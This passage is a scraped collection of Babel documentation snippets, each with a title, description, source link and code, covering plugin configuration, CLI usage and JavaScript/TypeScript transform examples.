json\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-react\"]\n}\n```\n\n----------------------------------------\n\nTITLE: ES2015 Parameters Example - Input JavaScript\nDESCRIPTION: This JavaScript code demonstrates the use of ES2015 parameters, including default parameters, destructuring parameters, and rest parameters.  The plugin transforms this code to be compatible with ES5 environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-parameters.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction test(x = \"hello\", { a, b }, ...args) {\n  console.log(x, a, b, args);\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Runtime Helper Example (Before)\nDESCRIPTION: Shows the output of Babel transformation without the runtime plugin for a simple class declaration.  It includes the `_classCallCheck` helper inline. This illustrates how Babel normally inlines helper functions which can lead to code duplication.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Person {}\n```\n\n----------------------------------------\n\nTITLE: Required core-js module for Promise.finally() in JavaScript\nDESCRIPTION: This JavaScript code shows the output after Babel transforms the `Promise.finally()` example with `useBuiltIns: 'usage'`.  It requires the core-js module that provides the polyfill for `Promise.prototype.finally`.  This ensures that the `finally()` method is available even in environments that don't natively support it.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"core-js/modules/es.promise.finally\");\n\nPromise.resolve().finally();\n```\n\n----------------------------------------\n\nTITLE: Nullish Coalescing Input JavaScript\nDESCRIPTION: Illustrates the nullish coalescing assignment operator (??=) in JavaScript. This example shows how the plugin handles this operator when the `@babel/plugin-transform-nullish-coalescing-operator` plugin is also used (as included in `@babel/preset-env`).\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-logical-assignment-operators.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\na ??= b;\nobj.a.b ??= c;\n```\n\n----------------------------------------\n\nTITLE: Importing JSON Modules (JavaScript)\nDESCRIPTION: This JavaScript code demonstrates how to import a JSON file as a module using the `import` declaration with a `type: \"json\"` import attribute.  This relies on the [JSON modules](https://github.com/tc39/proposal-json-modules) proposal and requires the `@babel/plugin-proposal-json-modules` plugin.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2024-02-28-7.24.0.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nimport myConfig from \"./config.json\" with { type: \"json\" };\n```\n\n----------------------------------------\n\nTITLE: Deleting Deeply Nested Properties in JavaScript\nDESCRIPTION: Shows how to use optional chaining with the `delete` operator to safely delete deeply nested properties in an object, preventing errors when intermediate properties are null or undefined. Added in v7.8.0.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-optional-chaining.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst obj = {\n  foo: {\n    bar: {},\n  },\n};\n\nconst ret = delete obj?.foo?.bar?.baz; // true\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with a Configuration File (JSON)\nDESCRIPTION: This JSON configuration snippet shows how to enable the @babel/plugin-transform-numeric-separator plugin within a babel.config.json file. This configuration is recommended for a structured Babel setup.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-numeric-separator.md#_snippet_4\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-numeric-separator\"]\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript Parameter Configuration Error Example\nDESCRIPTION: This Javascript snippet illustrates an error case in Babel configuration, where the same plugin is used twice with different parameters without a name. Babel interprets this as redundant and throws an error because the second instance would simply overwrite the first.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\nplugins: [[\"./plug\", { one: true }], [\"./plug\", { two: true }]];\n```\n\n----------------------------------------\n\nTITLE: Transformed Private Methods (Default)\nDESCRIPTION: This JavaScript code shows the default transformation of the private method in the previous example. It uses `WeakSet` and `babelHelpers` to implement private access.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-methods.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar Foo = function Foo() {\n  \"use strict\";\n\n  babelHelpers.classCallCheck(this, Foo);\n\n  _privateMethod.add(this);\n\n  this.publicField = babelHelpers\n    .classPrivateMethodGet(this, _privateMethod, _privateMethod2)\n    .call(this);\n};\n\nvar _privateMethod = new WeakSet();\n\nvar _privateMethod2 = function _privateMethod2() {\n  return 42;\n};\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage with Presets (Shell)\nDESCRIPTION: This snippet shows how to use the Babel CLI with presets. In Babel 7, preset resolution is consistent, working relative to the config file or working directory, which avoids issues encountered in Babel 6 where presets couldn't be found.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\nbabel --presets @babel/preset-env ../file.js\n```\n\n----------------------------------------\n\nTITLE: Decorators Configuration (Diff)\nDESCRIPTION: This snippet demonstrates how to configure the `@babel/plugin-proposal-decorators` plugin to use the legacy syntax. Setting the `legacy` option to `true` preserves the old behavior.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_29\n\nLANGUAGE: diff\nCODE:\n```\n {\n   \"plugins\": [\n-    \"@babel/plugin-proposal-decorators\"\n+    [\"@babel/plugin-proposal-decorators\", { \"legacy\": true }]\n   ]\n }\n```\n\n----------------------------------------\n\nTITLE: Using plugin via Node API\nDESCRIPTION: Demonstrates how to use the Babel Node API to transform code using the specified plugin. It requires @babel/core and then calls transformSync with the code and plugin configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-escapes.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-unicode-escapes\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Valid Partial Application Usage JavaScript\nDESCRIPTION: Illustrates several valid ways to use the `?` placeholder for partial application in JavaScript, including function calls, method calls on objects, and calls on SuperProperty.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-partial-application.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nf(x, ?)           // partial application from left\nf(?, x)           // partial application from right\nf(?, x, ?)        // partial application for any arg\no.f(x, ?)         // partial application from left\no.f(?, x)         // partial application from right\no.f(?, x, ?)      // partial application for any arg\nsuper.f(?)        // partial application allowed for call on |SuperProperty|\n```\n\n----------------------------------------\n\nTITLE: Compile with Inline Source Maps\nDESCRIPTION: Compiles `script.js` to `script-compiled.js` and includes the source map directly in the output file. The `--source-maps inline` option ensures inline source map generation.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel script.js --out-file script-compiled.js --source-maps inline\n```\n\n----------------------------------------\n\nTITLE: CLI Usage\nDESCRIPTION: This command demonstrates how to use the Babel CLI to transform a JavaScript file (script.js) using the @babel/plugin-transform-jscript plugin. The --plugins flag specifies the plugin to use.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-jscript.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-jscript script.js\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration (without options)\nDESCRIPTION: Example of how to configure the plugin in a Babel configuration file without any options.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-commonjs.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-modules-commonjs\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Class with public and private fields/methods in JavaScript\nDESCRIPTION: This code demonstrates the new class features available in Babel 7.14.0, including static public class fields, private fields (using #), and private getters. These features are now enabled by default, so the corresponding Babel plugins can be removed.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2021-04-29-7.14.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Check {\n  static className = \"Check\"; // static public class field\n\n  #value = 3; // # means private!\n\n  get #double() { // private getter\n    return this.#value * 2; // using a private field\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Node API: Pipeline Operator with ^^ Topic Token\nDESCRIPTION: This JavaScript code shows how to use the @babel/plugin-proposal-pipeline-operator via the Node API, setting the topic token to '^^'.  It uses @babel/core's `transformSync` to transform code with the plugin enabled.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-pipeline-operator.md#_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\n    [ \"@babel/plugin-proposal-pipeline-operator\", { topicToken: \"^^\" } ],\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin Transform Runtime with Corejs (Diff)\nDESCRIPTION: This snippet demonstrates how to configure the `@babel/plugin-transform-runtime` plugin to use `core-js`. By passing the `corejs` option with a value of `2` and using the `@babel/runtime-corejs2` dependency, you enable Babel to utilize `core-js` for polyfilling.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_15\n\nLANGUAGE: diff\nCODE:\n```\n{\n  \"plugins\": [\n-   [\"@babel/plugin-transform-runtime\"],\n+   [\"@babel/plugin-transform-runtime\", {\n+     \"corejs\": 2,\n+   }],\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Transform RegExp 'im' Modifiers in Babel\nDESCRIPTION: Transforms a regular expression with multiple modifiers enabled, such as 'im' (case-insensitive and multiline).\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-modifiers.md#_snippet_3\n\nLANGUAGE: js\nCODE:\n```\n// matches Aa, aa, A\\naa, etc. but not A\\na\nconst regex = /(?im:^a)a/\n```\n\n----------------------------------------\n\nTITLE: Generate code from AST using @babel/generator\nDESCRIPTION: This JavaScript code demonstrates how to use @babel/generator to transform an AST (Abstract Syntax Tree) into JavaScript code. It first parses the code using @babel/parser, then uses @babel/generator to generate code from the AST.  It imports the parse and generate functions, parses a simple class definition, and generates code from the resulting AST.\nSOURCE: https://github.com/babel/website/blob/main/docs/generator.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport { parse } from \"@babel/parser\";\nimport { generate } from \"@babel/generator\";\n\nconst code = \"class Example {}\";\nconst ast = parse(code);\n\nconst output = generate(\n  ast,\n  {\n    /* options */\n  },\n  code\n);\n```\n\n----------------------------------------\n\nTITLE: Function Bind with document.querySelectorAll JavaScript\nDESCRIPTION: Illustrates using function bind with `document.querySelectorAll` to apply array methods to a NodeList. Shows how the bind operator simplifies chaining map and filter calls.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-bind.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst { map, filter } = Array.prototype;\n\nlet sslUrls = document\n  .querySelectorAll(\"a\")\n  ::map(node => node.href)\n  ::filter(href => href.substring(0, 5) === \"https\");\n\nconsole.log(sslUrls);\n```\n\n----------------------------------------\n\nTITLE: Copy Files During Compilation\nDESCRIPTION: Copies files from the `src` directory to the `lib` directory that are not compiled by Babel (e.g., non-JavaScript files).  The `--copy-files` option enables copying these files.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel src --out-dir lib --copy-files\n```\n\n----------------------------------------\n\nTITLE: Destructuring Example: Input JavaScript\nDESCRIPTION: This JavaScript code demonstrates destructuring assignment with objects and arrays.  It assigns values from the `obj` object to the `x` and `y` variables, and destructures the `arr` array into `a`, `b`, and the rest of the elements into `rest`. This example is meant to be transformed by the babel plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-destructuring.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet { x, y } = obj;\n\nlet [a, b, ...rest] = arr;\n```\n\n----------------------------------------\n\nTITLE: Advanced Babel Configuration (JSON) - Babel 8\nDESCRIPTION: This JSON configuration file shows advanced options for @babel/preset-react for Babel 8, including setting the runtime to 'automatic', customizing the import source, and disabling namespace error throwing. The runtime option selects the automatic JSX runtime.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-react.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\n      \"@babel/preset-react\",\n      {\n        \"runtime\": \"automatic\", // defaults to automatic\n        \"importSource\": \"custom-jsx-library\", // defaults to react(only in automatic runtime)\n        \"throwIfNamespace\": false // defaults to true\n        // \"pragma\": \"dom\", // default pragma is React.createElement (only in classic runtime)\n        // \"pragmaFrag\": \"DomFrag\", // default is React.Fragment (only in classic runtime)\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript Example\nDESCRIPTION: Demonstrates a basic TypeScript code snippet using type annotations. The plugin transforms this code by removing the type annotation, resulting in plain JavaScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\nconst x: number = 0;\n```\n\n----------------------------------------\n\nTITLE: Babel CLI Usage\nDESCRIPTION: Command-line usage example to transpile a TypeScript file (script.js) using the specified plugin. This command directly invokes Babel with the plugin enabled to process the input file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-typescript script.js\n```\n\n----------------------------------------\n\nTITLE: Use Babel Node API with preset-es2015\nDESCRIPTION: Transforms JavaScript code using the Babel Node API with the @babel/preset-es2015 preset. Requires @babel/core.  It calls `transformSync` to synchronously transform the string 'code'.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-es2015.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  presets: [\"@babel/preset-es2015\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Logical Assignment Operators Output JavaScript\nDESCRIPTION: Shows the output JavaScript code after the Babel plugin has transformed the logical assignment operators.  The plugin converts the operators into standard if/else assignment expressions compatible with ES5.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-logical-assignment-operators.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _obj$a, _obj$a2;\n\na || (a = b);\n(_obj$a = obj.a).b || (_obj$a.b = c);\n\na && (a = b);\n(_obj$a2 = obj.a).b && (_obj$a2.b = c);\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Preset Env in babel.config.json\nDESCRIPTION: This JSON configuration enables the @babel/preset-env preset in Babel, allowing it to transform ES2015+ code.  The file should be named babel.config.json and placed in the project root.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/setup.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"@babel/preset-env\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Transform React Constant Elements (JSX)\nDESCRIPTION: Demonstrates how the plugin transforms JSX code by hoisting constant React elements to prevent unnecessary reinstantiations. It shows the input and output JSX code, where constant elements are assigned to variables and reused.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-constant-elements.md#_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\nconst Hr = () => {\n  return <hr className=\"hr\" />;\n};\n\nconst WithChildren = (props) => {\n  return <div className={props.className}>\n    <hr />\n  </div>;\n}\n```\n\nLANGUAGE: JSX\nCODE:\n```\nvar _hr, _hr2;\n\nconst Hr = () => {\n  return _hr || (_hr = <hr className=\"hr\" />);\n};\n\nconst WithChildren = (props) => {\n  return <div className={props.className}>\n    {_hr2 || (_hr2 = <hr />)}\n  </div>;\n}\n```\n\n----------------------------------------\n\nTITLE: Transformed ES5 Class Example (Output)\nDESCRIPTION: The output code generated by Babel when transforming the ES2015 class example. It demonstrates how the class is converted into ES5-compatible function and prototype-based code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-classes.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction _classCallCheck(instance, Constructor) {\n  if (!(instance instanceof Constructor)) {\n    throw new TypeError(\"Cannot call a class as a function\");\n  }\n}\n\nvar Test = (function() {\n  function Test(name) {\n    _classCallCheck(this, Test);\n\n    this.name = name;\n  }\n\n  Test.prototype.logger = function logger() {\n    console.log(\"Hello\", this.name);\n  };\n\n  return Test;\n})();\n```\n\n----------------------------------------\n\nTITLE: Implementing Private Instance Accessors in JavaScript\nDESCRIPTION: This code snippet demonstrates the implementation of private instance accessors (getters and setters) in JavaScript using the '#' prefix.  It showcases how to define a private property and a private getter method within a class, and how to access the private property within the class methods. The babel plugin `@babel/plugin-proposal-private-methods` or `stage-3` preset needs to be enabled to use this feature.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-01-21-7.3.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Person {\n  #firstname = \"Babel\";\n  #lastname = \"JS\";\n\n  get #name() {\n    return this.#firstname + \" \" + this.#lastname;\n  }\n\n  sayHi() {\n    alert(`Hi, ${this.#name}!`);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via CLI\nDESCRIPTION: Command to use the plugin via the Babel CLI.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-modules.md#_snippet_7\n\nLANGUAGE: sh\nCODE:\n```\nbabel --plugins=@babel/plugin-transform-json-modules script.js\n```\n\n----------------------------------------\n\nTITLE: Install @babel/generator using npm/yarn\nDESCRIPTION: This command installs the @babel/generator package as a development dependency using npm or yarn. This package is essential for converting a Babel AST (Abstract Syntax Tree) into readable JavaScript code.\nSOURCE: https://github.com/babel/website/blob/main/docs/generator.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/generator\n```\n\n----------------------------------------\n\nTITLE: Configure plugin in babel.config.json (JSON)\nDESCRIPTION: This JSON configuration shows how to enable the `@babel/plugin-proposal-optional-chaining-assign` plugin in Babel using a `babel.config.json` file.  The version option is required.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-optional-chaining-assign.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    [\n      \"@babel/plugin-proposal-optional-chaining-assign\",\n      {\n        \"version\": \"2023-07\"\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: TypeScript Key Remapping in Mapped Types Example\nDESCRIPTION: This code demonstrates key remapping in mapped types in TypeScript 4.1. It defines a type `Getters` that transforms the keys of an object type `T` by adding a 'get' prefix and capitalizing the original key. This allows creating getter functions for object properties at the type level.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-10-15-7.12.0.md#_snippet_1\n\nLANGUAGE: TypeScript\nCODE:\n```\ntype Getters<T> = {\n    [K in keyof T as `get${Capitalize<K>}`]: () => T[K]\n};\n\ninterface Dog { name: string; age: number; }\n\nconst lazyDog: Getters<Dog> = /* ... */;\nlazyDog.getName(); // string\nlazyDog.age; // error!\n```\n\n----------------------------------------\n\nTITLE: Configuration File Example (JSON - with options)\nDESCRIPTION: Illustrates how to configure the babel-plugin-minify-replace plugin with specific options within a Babel configuration file.  The example shows how to define a replacement for the `__DEV__` identifier, setting its type to `booleanLiteral` and value to `true`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-replace.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    [\"minify-replace\", {\n      \"replacements\": [{\n        \"identifierName\": \"__DEV__\",\n        \"replacement\": {\n          \"type\": \"booleanLiteral\",\n          \"value\": true\n        }\n      }]\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Generators in JavaScript\nDESCRIPTION: Explains how to use generators to simplify iterator authoring in ES2015. The example defines a Fibonacci sequence generator using `function*` and `yield`. It also shows the generator interface using TypeScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_10\n\nLANGUAGE: TypeScript\nCODE:\n```\ninterface Generator extends Iterator {\n    next(value?: any): IteratorResult;\n    throw(exception: any);\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel plugin in babel.config.json\nDESCRIPTION: This JSON configuration snippet shows how to enable the `@babel/plugin-transform-property-literals` plugin by adding it to the `plugins` array in `babel.config.json`. This is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-property-literals.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-property-literals\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Partial Application Examples JavaScript\nDESCRIPTION: Demonstrates valid usage of the partial application syntax using the `?` placeholder within function calls. It showcases applying arguments from the left and right, as well as a more complex example with a pipe operator.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-partial-application.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction add(x, y) { return x + y; }\n\nconst addOne = add(1, ?); // apply from the left\naddOne(2); // 3\n\nconst addTen = add(?, 10); // apply from the right\naddTen(2); // 12\n\nlet newScore = player.score\n  |> add(7, ?)\n  |> clamp(0, 100, ?); // shallow stack, the pipe to `clamp` is the same frame as the pipe to `add`.\n```\n\n----------------------------------------\n\nTITLE: Babel Config with Scoped Packages\nDESCRIPTION: Demonstrates how to configure Babel with scoped packages in `babel.config.js`.  It shows how to specify presets and plugins, including the `@babel/` scope.  This is important for configuring Babel 7 with the new scoped package names.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  presets: [\"@babel/env\"], // \"@babel/preset-env\"\n  plugins: [\"@babel/transform-arrow-functions\"], // same as \"@babel/plugin-transform-arrow-functions\"\n};\n```\n\n----------------------------------------\n\nTITLE: Nullish Coalescing Example in JavaScript\nDESCRIPTION: This snippet demonstrates the usage of the nullish coalescing operator (`??`) in JavaScript. It provides a fallback value when an expression evaluates to `null` or `undefined`. It shows how `??` differs from the logical OR (`||`) operator, only checking for nullish values, whereas `||` checks for falsy values.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-01-11-7.8.0.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst name = person.fullName ?? \"Anonymous\";\nconsole.log(`Hello, ${name}!`);\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin via JSON\nDESCRIPTION: This JSON configuration file shows how to enable the @babel/plugin-transform-json-strings plugin in a Babel project. This is the recommended method for using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-json-strings.md#_snippet_2\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-json-strings\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring @babel/transform-runtime for core-js 3 in JavaScript\nDESCRIPTION: This code snippet shows how to configure @babel/transform-runtime to use core-js 3. This involves setting the `corejs` option to `3` within the plugin configuration.  It requires @babel/plugin-transform-runtime and @babel/runtime-corejs3 as dependencies.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nplugins: [\n  [\"@babel/transform-runtime\", {\n    corejs: 3,\n  }]\n]\n```\n\n----------------------------------------\n\nTITLE: Temporal Dead Zone Example JavaScript\nDESCRIPTION: Demonstrates the temporal dead zone (TDZ) scenario with let variables.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoping.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\ni;\nlet i;\n```\n\n----------------------------------------\n\nTITLE: Configuring Parser Plugins\nDESCRIPTION: This snippet shows how to configure parser plugins in the .babelrc file. Parser plugins enable Babel to parse specific syntax, even if a corresponding transform plugin isn't used. The parserOpts.plugins option takes an array of plugin names.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugins.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"parserOpts\": {\n    \"plugins\": [\"jsx\", \"flow\"]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Import Babel Polyfill\nDESCRIPTION: This code snippet shows how to import the `@babel/polyfill` package using ES6 `import` syntax. It is crucial to place this import statement at the very top of the entry point to ensure polyfills are loaded first. This is essential when using ES6 modules in the application's main file.\nSOURCE: https://github.com/babel/website/blob/main/docs/polyfill.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"@babel/polyfill\";\n```\n\n----------------------------------------\n\nTITLE: Install plugin via npm\nDESCRIPTION: Command to install the @babel/plugin-transform-react-jsx-development plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-development.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-react-jsx-development\n```\n\n----------------------------------------\n\nTITLE: Removing babel-plugin-transform-class-constructor-call\nDESCRIPTION: This snippet demonstrates the removal of `babel-plugin-transform-class-constructor-call` due to the TC39 proposal being dropped. It provides an alternative approach using a static method instead of `call constructor` to achieve similar functionality. It includes example code to replace the removed feature.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_31\n\nLANGUAGE: diff\nCODE:\n```\n  class Point {\n    constructor(x, y) {\n      this.x = x;\n      this.y = y;\n    }\n\n-  call constructor(x, y) {\n+  static secondConstructor(x, y) {\n      return new Point(x, y);\n    }\n  }\n\n  let p1 = new Point(1, 2);\n- let p2 = Point(3, 4);\n+ let p2 = Point.secondConstructor(3, 4);\n```\n\n----------------------------------------\n\nTITLE: Basic Babel Compilation\nDESCRIPTION: Compiles `script.js` using Babel and outputs the result to standard output.  Requires `@babel/cli` and `@babel/core` to be installed. Uses `npx` to execute the locally installed Babel CLI.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel script.js\n```\n\n----------------------------------------\n\nTITLE: Loose Mode: Method Enumerability Example\nDESCRIPTION: Explains that in loose mode class methods are enumerable, which is not in line with the spec and may cause issues.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-classes.md#_snippet_10\n\n\n\n----------------------------------------\n\nTITLE: JSX Transform Input Example (JSX)\nDESCRIPTION: This JSX code snippet is an example of the input that the new JSX transform will process.  It defines a simple functional component that returns a `div` element.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-03-16-7.9.0.md#_snippet_9\n\nLANGUAGE: jsx\nCODE:\n```\nfunction Foo() {\n  return <div />;\n}\n```\n\n----------------------------------------\n\nTITLE: Print effective Babel configs on Powershell\nDESCRIPTION: This powershell snippet demonstrates how to print effective configs on a given input path on powershell environments using the BABEL_SHOW_CONFIG_FOR environment variable. The environment variable specifies the file for which Babel should print the effective configurations. The npm start command initiates the Babel processing.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_8\n\nLANGUAGE: powershell\nCODE:\n```\n$env:BABEL_SHOW_CONFIG_FOR = \".\\src\\myComponent.jsx\"; npm start\n```\n\n----------------------------------------\n\nTITLE: Babel configuration file\nDESCRIPTION: This JSON configuration shows how to enable the `@babel/plugin-proposal-import-defer` and `@babel/plugin-transform-modules-commonjs` plugins in your Babel project.  It's the recommended way to configure Babel.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-defer.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\n    \"@babel/plugin-proposal-import-defer\",\n    \"@babel/plugin-transform-modules-commonjs\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel TypeScript Preset Configuration\nDESCRIPTION: This JSON configuration snippet shows how to configure the `@babel/preset-typescript` with the `rewriteImportExtensions` option set to `true`. This will rewrite `.ts`/`.mts`/`.cts` extensions in import declarations to `.js`/`.mjs`/`.cjs`. Also, ensure the TypeScript configuration has the `allowImportingTsExtensions` option set to `true` to enable importing `.ts` extensions.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-09-25-7.23.0.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-typescript\", {\n      \"rewriteImportExtensions\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Enable Declare Fields in Babel Config (JSON)\nDESCRIPTION: This JSON configuration snippet shows how to enable support for Flow's `declare` fields in Babel using the `allowDeclareFields` option in `@babel/preset-flow`. This option enables the removal of `declare` fields during transformation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-03-16-7.9.0.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-flow\", {\n      \"allowDeclareFields\": true\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/register Package\nDESCRIPTION: This snippet shows how to install the `@babel/register` package as a development dependency using npm. It's used to replace the deprecated usage of `babel-core/register` in Babel 7.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_33\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/register\n```\n\n----------------------------------------\n\nTITLE: React Fragments Classic Runtime (JSX to JS)\nDESCRIPTION: Illustrates the transformation of React Fragments using the classic runtime and `React.Fragment`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst descriptions = items.map((item) => (\n  <>\n    <dt>{item.name}</dt>\n    <dd>{item.value}</dd>\n  